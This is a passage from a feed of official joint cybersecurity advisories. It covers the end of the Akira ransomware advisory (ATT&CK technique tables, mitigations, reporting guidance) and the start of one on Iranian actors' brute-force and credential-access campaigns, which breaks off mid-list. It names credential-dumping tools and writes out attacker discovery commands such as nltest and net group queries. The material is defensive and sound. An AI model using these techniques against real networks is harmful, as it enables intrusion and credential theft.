<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>Akira threat actors use tools like Mimikatz and LaZagne to dump credentials.</td>
</tr>
<tr>
<td>
<p>OS Credential Dumping:</p>
<p>LSASS Memory</p>
</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a></td>
<td>Akira threat actors attempt to access credential material stored in the process memory of the LSASS.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>System Network Configuration Discovery&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1016/\" title=\"System Network Configuration Discovery\">T1016</a></td>
<td>Akira threat actors use tools to scan systems and identify services running on remote hosts and local network infrastructure.</td>
</tr>
<tr>
<td>System Information Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1082/\" title=\"System Information Discovery\">T1082</a></td>
<td>Akira threat actors use tools like PCHunter64 to&nbsp;acquire detailed process and system information.</td>
</tr>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>Akira threat actors use the net Windows command to enumerate domain information.</td>
</tr>
<tr>
<td>Process Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1057/\" title=\"Process Discovery\">T1057</a></td>
<td>Akira threat actors use the&nbsp;<code>Tasklist</code> utility to obtain details on running processes via PowerShell.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Local Groups</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/001/\" title=\"Permission Groups Discovery: Local Groups\">T1069.001</a></td>
<td>Akira threat actors use the&nbsp;<code>net localgroup /dom</code> to find local system groups and permission settings.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Domain Groups&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a></td>
<td>Akira threat actors use the&nbsp;<code>net group /domain</code>&nbsp;command to attempt to find domain level groups and permission settings.</td>
</tr>
<tr>
<td>Remote System Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a></td>
<td>Akira threat actors use&nbsp;<code>nltest / dclist</code> to amass a listing of other systems by IP address, hostname, or other logical identifiers on a network.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Create Account: Domain Account</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1136/002/\" title=\"Create Account: Domain Account\">T1136.002</a></td>
<td>Akira threat actors attempt to abuse the functions of domain controllers by creating new domain accounts to establish persistence.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1562/001\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>Akira threat actors use BYOVD attacks to disable antivirus software.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1219\" title=\"Remote Access Software\">T1219</a></td>
<td>Akira threat actors use legitimate desktop support software like AnyDesk to obtain remote access to victim systems.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>Akira threat actors utilized Ngrok to create a secure tunnel to servers that aided in exfiltration of data.&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Archive Collected Data: Archive via Utility</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a></td>
<td>Akira threat actors use tools like WinRAR to compress files.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 13: Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over Alternative Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a></td>
<td>Akira threat actors use file transfer tools like WinSCP to transfer data.</td>
</tr>
<tr>
<td>Transfer Data to Cloud Account</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1537\" title=\"Transfer Data to Cloud Account\">T1537</a></td>
<td>Akira threat actors use tools like CloudZilla to exfiltrate data to a cloud account and connect to exfil servers they control.</td>
</tr>
<tr>
<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a></td>
<td>Akira threat actors leveraged RClone to sync files with cloud storage services to exfiltrate data.&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 14: Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Date Encrypted for Impact</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></td>
<td>Akira threat actors encrypt data on target systems to interrupt availability to system and network resources.</td>
</tr>
<tr>
<td>Inhibit System Recovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1490\" title=\"Inhibit System Recovery\">T1490</a></td>
<td>Akira threat actors delete volume shadow copies on Windows systems.</td>
</tr>
<tr>
<td>Financial Theft</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1657/\" title=\"Financial Theft\">T1657</a></td>
<td>Akira threat actors use a double-extortion model for financial gain.</td>
</tr>
</tbody>
</table>
<h3><strong>MITIGATIONS</strong></h3>
<h4><strong>Network Defenders</strong></h4>
<p>The FBI, CISA, EC3, and NCSC-NL recommend organizations apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the risk of compromise by Akira ransomware. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li><strong>Implement a recovery plan</strong> to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud) [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">2.R</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#IncidentResponseIRPlans2S\" title=\"Incident Response (IR) Plans (2.S)\">2.S</a>].</li>
<li><strong>Require all accounts</strong> with password logins (e.g., service accounts, admin accounts, and domain admin accounts)&nbsp;<strong>to comply</strong> with NIST’s&nbsp;<a href=\"https://pages.nist.gov/800-63-3/\" target=\"_blank\" title=\"https://pages.nist.gov/800-63-3/\">standards</a>. In particular, require employees to use long passwords and consider not requiring recurring password changes, as these can weaken security&nbsp;[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#UniqueCredentials2C\" title=\"Unique Credentials (2.C)\">CPG 2.C</a>].</li>
<li><strong>Require multifactor authentication</strong> for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CPG 2.H</a>].</li>
<li><strong>Keep all operating systems, software, and firmware up to date.</strong> Timely patching is one of the most efficient and cost effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">known exploited vulnerabilities</a> in internet-facing systems. [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>].</li>
<li><strong>Segment networks</strong> to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>].</li>
<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.</strong> To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
<li><strong>Filter network traffic</strong> by preventing unknown or untrusted origins from accessing remote services on internal systems. This prevents threat actors from directly connecting to remote access services that they have established for persistence.</li>
<li><strong>Install, regularly update, and enable real time detection for antivirus software</strong> on all hosts.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#AssetInventory1A\" title=\"Asset Inventory (1.A)\">CPG 1.A</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DocumentDeviceConfigurations2O\" title=\"Document Device Configurations (2.O)\">2.O</a>].</li>
<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li><strong>Disable unused</strong> <strong>ports</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#ProhibitConnectionofUnauthorizedDevices2V\" title=\"Prohibit Connection of Unauthorized Devices (2.V)\">CPG 2.V</a>].</li>
<li><strong>Consider adding an email banner to emails</strong> received from outside of your organization [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M\" title=\"Email Security (2.M)\">CPG 2.M</a>].</li>
<li><strong>Disable hyperlinks</strong> in received emails.</li>
<li><strong>Implement time-based access for accounts set at the admin level and higher.</strong> For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the <a href=\"https://www.cisa.gov/zero-trust-maturity-model\" title=\"Zero Trust Maturity Model\">Zero Trust model</a>). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.</li>
<li><strong>Disable command-line and scripting activities and permissions.</strong> Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N\" title=\"Disable Macros by Default (2.N)\">2.N</a>].</li>
<li><strong>Maintain offline backups of data,</strong> and regularly maintain backup and restoration [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">CPG 2.R</a>]. By instituting this practice, the organization helps ensure they will not be severely interrupted, and/or only have irretrievable data.&nbsp;</li>
<li><strong>Ensure all backup data is encrypted, immutable</strong> (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#StrongandAgileEncryption2K\" title=\"Strong and Agile Encryption (2.K)\">CPG 2.K</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureSensitiveData2L\" title=\"Secure Sensitive Data (2.L)\">2.L</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">2.R</a>].</li>
</ul>
<h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>
<p>In addition to applying mitigations, the FBI, CISA, EC3, and NCSC-NL recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The FBI, CISA, EC3 and NCSC-NL recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see Tables 6 -14).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The FBI, CISA, EC3, and NCSC-NL recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h3><strong>RESOURCES</strong></h3>
<ul>
<li><a href=\"https://www.stopransomware.gov/\" title=\"#StopRansomware\">Stopransomware.gov</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to mitigate a ransomware attack: <a href=\"https://www.cisa.gov/resources-tools/resources/stopransomware-guide\" title=\"Joint Ransomware Task Force (JRTF) #StopRansomware Guide\">#StopRansomware Guide</a>.</li>
<li>No cost cyber hygiene services: <a href=\"https://www.cisa.gov/cyber-hygiene-services\" title=\"Cyber Hygiene Services\">Cyber Hygiene Services</a>, <a href=\"https://github.com/cisagov/cset/releases/tag/v10.3.0.0\" title=\"Ransomware Readiness Assessment CSET v10.3\">Ransomware Readiness Assessment</a>.</li>
</ul>
<h3><strong>REFERENCES</strong></h3>
<ol>
<li><a href=\"https://www.fortinet.com/blog/threat-research/ransomware-roundup-akira\" title=\"Ransomware Roundup - Akira\">Fortinet: Ransomware Roundup - Akira</a></li>
<li><a href=\"https://blogs.cisco.com/security/akira-ransomware-targeting-vpns-without-multi-factor-authentication\" title=\"Akira Ransomware Targeting VPNs without Multi-Factor Authentication\">Cisco: Akira Ransomware Targeting VPNs without MFA</a></li>
<li><a href=\"https://www.truesec.com/hub/blog/akira-ransomware-and-exploitation-of-cisco-anyconnect-vulnerability-cve-2020-3259\" title=\"Akira Ransomware and Exploitation of Cisco Anyconnect Vulnerability CVE-2020-3259\">Truesec: Indications of Akira Ransomware Group Actively Exploiting Cisco AnyConnect CVE-2020-3259</a></li>
<li><a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">TrendMicro: Akira Ransomware Spotlight</a></li>
<li><a href=\"https://www.crowdstrike.com/cybersecurity-101/kerberoasting/\" title=\"KERBEROASTING ATTACKS\">CrowdStrike: What is a Kerberoasting Attack?</a></li>
<li><a href=\"https://news.sophos.com/en-us/2023/12/21/akira-again-the-ransomware-that-keeps-on-taking/\" title=\"Akira, again: The ransomware that keeps on taking\">Sophos: Akira, again: The ransomware that keeps on taking</a></li>
<li><a href=\"https://news.sophos.com/en-us/2023/05/09/akira-ransomware-is-bringin-88-back/\" title=\"Akira Ransomware is “bringin’ 1988 back”\">Sophos: Akira Ransomware is “bringin’ 1988 back”</a></li>
</ol>
<h3><strong>REPORTING</strong></h3>
<p>Your organization has no obligation to respond or provide information back to the FBI in response to this joint CSA. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.</p>
<p>The FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Akira threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>The FBI, CISA, EC3, and NCSC-NL do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s&nbsp;<a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complain Center (IC3)\">Internet Crime Complain Center (IC3)</a>, a local <u>FBI&nbsp;</u><a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">Field Office</a>, or CISA via the agency’s&nbsp;<a href=\"https://www.cisa.gov/forms/report\" title=\"Incident Reporting System\">Incident Reporting System</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or by calling 1-844-Say-CISA (1-844-729-2472).</p>
<h3><strong>DISCLAIMER</strong></h3>
<p>The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, EC3, and NCSC-NL do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI or CISA.</p>
<h3><strong>ACKNOWLEDGEMENTS</strong></h3>
<p>Cisco, Sophos, and Fortinet contributed to this advisory.</p>
<h3><strong>VERSION HISTORY</strong></h3>
<p>April 18, 2024: Initial version.</p>
") (pubDate nil "Wed, 17 Apr 2024 12:23:11 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/21319")))) ("Iranian Cyber Actors’ Brute Force and Credential Access Activity Compromises Critical Infrastructure Organizations" "<h2><strong>Summary</strong></h2>
<p>The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), the Communications Security Establishment Canada (CSE), the Australian Federal Police (AFP), and Australian Signals Directorate's Australian Cyber Security Centre (ASD's ACSC) are releasing this joint Cybersecurity Advisory to warn network defenders of Iranian cyber actors’ use of brute force and other techniques to compromise organizations across multiple critical infrastructure sectors, including the healthcare and public health (HPH), government, information technology, engineering, and energy sectors. The actors likely aim to obtain credentials and information describing the victim’s network that can then be sold to enable access to cybercriminals.</p>
<p>Since October 2023, Iranian actors have used brute force, such as password spraying, and multifactor authentication (MFA) ‘push bombing’ to compromise user accounts and obtain access to organizations. The actors frequently modified MFA registrations, enabling persistent access. The actors performed discovery on the compromised networks to obtain additional credentials and identify other information that could be used to gain additional points of access. The authoring agencies assess the Iranian actors sell this information on cybercriminal forums to actors who may use the information to conduct additional malicious activity.</p>
<p>This advisory provides the actors’ tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs). The information is derived from FBI engagements with entities impacted by this malicious activity.</p>
<p>The authoring agencies recommend critical infrastructure organizations follow the guidance provided in the <strong>Mitigations</strong> section. At a minimum, organizations should ensure all accounts use strong passwords and register a second form of authentication.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/aa24-290a-iranian-cyber-actors-conduct-brute-force-and-credential-access-activity.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-290A Iranian Cyber Actors’ Brute Force and Credential Access Activity Compromises Critical Infrastructure Organizations</a>
    <span class=\"c-file__size\">(PDF,       794.32 KB
  )</span>
  </div>
</div>
<p>For a downloadable list of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/AA24-290A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-290A STIX XML</a>
    <span class=\"c-file__size\">(XML,       96.61 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/AA24-290A.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-290A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       81.92 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:&nbsp;</strong>This advisory uses the&nbsp;<a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\">MITRE ATT&amp;CK<sup>®</sup></a><a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\"> for Enterprise</a> framework, version 15. See the <strong>MITRE ATT&amp;CK Tactics and Techniques</strong> section in <strong>Appendix A</strong> for a table of the actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3><strong>Overview of Activity</strong></h3>
<p>The actors likely conduct reconnaissance operations to gather victim identity [<a href=\"https://attack.mitre.org/techniques/T1589/\" title=\"Gather Victim Identity Information\">T1589</a>] information. Once obtained, the actors gain persistent access to victim networks frequently via brute force [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/\" title=\"Brute Force\">T1110</a>]. After gaining access, the actors use a variety of techniques to further gather credentials, escalate privileges, and gain information about the entity’s systems and network. The actors also move laterally and download information that could assist other actors with access and exploitation.</p>
<h3><strong>Initial Access and Persistence</strong></h3>
<p>The actors use valid user and group email accounts [<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>], frequently obtained via brute force such as password spraying [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a>] although other times via unknown methods, to obtain initial access to Microsoft 365, Azure [<a href=\"https://attack.mitre.org/techniques/T1078/004/\" title=\"Valid Accounts: Cloud Accounts\">T1078.004</a>], and Citrix systems [<a href=\"https://attack.mitre.org/techniques/T1133/\" title=\"External Remote Services\">T1133</a>]. In some cases where push notification-based MFA was enabled, the actors send MFA requests to legitimate users seeking acceptance of the request. This technique—bombarding users with mobile phone push notifications until the user either approves the request by accident or stops the notifications— is known as “MFA fatigue” or “push bombing” [<a href=\"https://attack.mitre.org/techniques/T1621/\" title=\"Multi-Factor Authentication Request Generation\">T1621</a>].</p>
<p>Once the threat actors gain access to an account, they frequently register their devices with MFA to protect their access to the environment via the valid account:</p>
<ul>
<li>In two confirmed compromises, the actors leveraged a compromised user’s open registration for MFA [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a>] to register the actor’s own device [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/005/\" title=\"Account Manipulation: Device Registration\">T1098.005</a>] to access the environment.</li>
<li>In another confirmed compromise, the actors used a self-service password reset (SSPR) tool associated with a public facing Active Directory Federation Service (ADFS) to reset the accounts with expired passwords [<a href=\"https://attack.mitre.org/techniques/T1484/002/\" title=\"Domain or Tenant Policy Modification: Trust Modification\">T1484.002</a>] and then registered MFA through Okta for compromised accounts without MFA already enabled [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1556\" title=\"Modify Authentication Process\">T1556</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a>].</li>
</ul>
<p>The actors frequently conduct their activity using a virtual private network (VPN) service [<a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]. Several of the IP addresses in the actors’ malicious activity originate from exit nodes tied to the Private Internet Access VPN service.</p>
<h3><strong>Lateral Movement</strong></h3>
<p>The actors use Remote Desktop Protocol (RDP) for lateral movement&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a>]. In one instance, the actors used Microsoft Word to open PowerShell to launch the RDP binary&nbsp;<code>mstsc.exe</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1202\" title=\"Indirect Command Execution\">T1202</a><u>]</u>.</p>
<h3><strong>Credential Access</strong></h3>
<p>The actors likely use open-source tools and methodologies to gather more credentials.&nbsp;The actors performed Kerberos Service Principal Name (SPN) enumeration of several service accounts and received Kerberos tickets [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a>]. In one instance, the actors used the Active Directory (AD) Microsoft Graph Application Program Interface (API) PowerShell application likely to perform a directory dump of all AD accounts. Also, the actors imported the tool [<a href=\"https://attack.mitre.org/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a>] <code>DomainPasswordSpray.ps1</code>, which is openly available on GitHub&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1588/002/\" title=\"Obtain Capabilities: Tool\">T1588.002</a>], likely to conduct password spraying. The actors also used the command <code>Cmdkey /list</code>, likely to display usernames and credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1555/\">T1555</a>].</p>
<h3><strong>Privilege Escalation</strong></h3>
<p>In one instance, the actors attempted impersonation of the domain controller, likely by exploiting Microsoft’s Netlogon (also known as ”Zerologon”) privilege escalation vulnerability (CVE-2020-1472) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a>].</p>
<h3><strong>Discovery</strong></h3>
<p>The actors leverage&nbsp;living off the land (LOTL) to gain knowledge about the target systems and internal networks. The actors used the following Windows command-line tools to gather information about domain controllers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1018\" title=\"Remote System Discovery\">T1018</a>], trusted domains [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a>], lists of domain administrators, and enterprise administrators [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1087/002/\" title=\"Account Discovery: Domain Account\">T1087.002</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/003/\" title=\"Permission Groups Discovery: Cloud Groups\">T1069.003</a>]:</p>
<ul>
<li><code>Nltest /dclist</code></li>
<li><code>Nltest /domain_trusts</code></li>
<li><a><code>Nltest /domain_trusts</code></a><code>/all_trusts</code></li>
<li><code>Net group “Enterprise admins” /domain</code></li>
<li><code>Net group “Domain admins” /domain</code></li>
</ul>
